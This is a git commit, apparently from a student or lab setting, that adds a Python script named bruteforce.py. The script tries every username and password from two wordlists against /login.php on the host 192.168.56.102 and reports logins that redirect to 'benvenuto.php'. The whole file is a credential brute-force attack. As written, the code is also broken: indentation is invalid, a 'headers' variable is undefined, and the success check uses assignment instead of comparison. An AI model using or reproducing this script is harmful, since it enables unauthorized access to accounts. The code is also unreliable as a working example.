26e7cb45af7176e3dbbeb8265876b6b73d6169bf
IlariaColaiocco <109146601+IlariaColaiocco@users.noreply.github.com>
2022-07-25 15:38:32 +0200

    Add files via upload

---
+++ bruteforce.py
@@ -0,0 +1,22 @@
+import http.client, urllib.parse
+
+username_file = open('nomi_utenti.txt')
+password_file = open('password.txt')
+
+user_list = username_file.readlines()
+pwd_list = password_file.readlines()
+for user in user_list:
+	user = user.rstrip()
+	for pwd in pwd_list:
+	pwd = pwd.rstrip()
+
+
+
+	print (user,"-",pwd)
+	post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Submit': "Submit"})
+	conn = http.client.HTTPConnection("192.168.56.102",80)
+	conn.request("POST","/login.php", post_parameters, headers)
+	response = conn.getresponse()
+
+	if(response.getheader('location') = "benvenuto.php"):
+	print("Logged with",user,"_",pwd)
